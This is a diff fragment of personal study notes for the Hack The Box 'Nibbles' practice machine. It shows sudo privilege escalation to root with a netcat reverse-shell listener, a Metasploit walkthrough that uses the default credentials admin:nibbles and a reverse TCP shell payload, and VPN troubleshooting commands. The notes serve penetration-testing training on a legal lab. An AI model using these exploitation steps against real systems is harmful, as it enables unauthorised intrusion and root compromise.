@@ -775,4 +775,23 @@ $sudo bash /home/nibbler/personal/stuff/monitor.sh
 (User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 $nc -lvnp 8443  :waiting for root reverse
-$which ~root.txt to find plag
+$ls ~/root.txt to find plag
+10.129.194.166
+\\\\\\\\\\\\\\\=========================
+Nibbles-Alternate User Method - Metasploit
+$msfconsole -> $search nibbleblog -> $use 0 (to load the selected exploit)
+-> $set rhosts <targetip> -> $set lhost <atkip> -> $show options
+- set the admin username and password admin:nibbles and the TARGETURI to nibbleblog
+$set username admin -> set password nibbles -> set targeturi nibbleblog
+- change the pyload type for our purpose let go with generic/shell_reverse_tcp/
+-> $set payload generic/shell_reverse_tcp -> $show option -> $exploit
+\\\\\\\\\\\\\\\\==========================
+Common Pitfalls
+connect to VPN: $sudo openvpn ./htb.ovpn
+Getting VPN addr: $ip -4 a show tun0
+check rounting table: $sudo netstat -rn
+pinning gateway: $ping -c 4 10.10.14.1
+one -device connect to VPN pawnbox 1  -> checking region
+Changing SSH key and password: ssh-keygen 
+bydefault ssh key are stored in the .ssh folder within our home folder /home/htb-student/.ssh
+
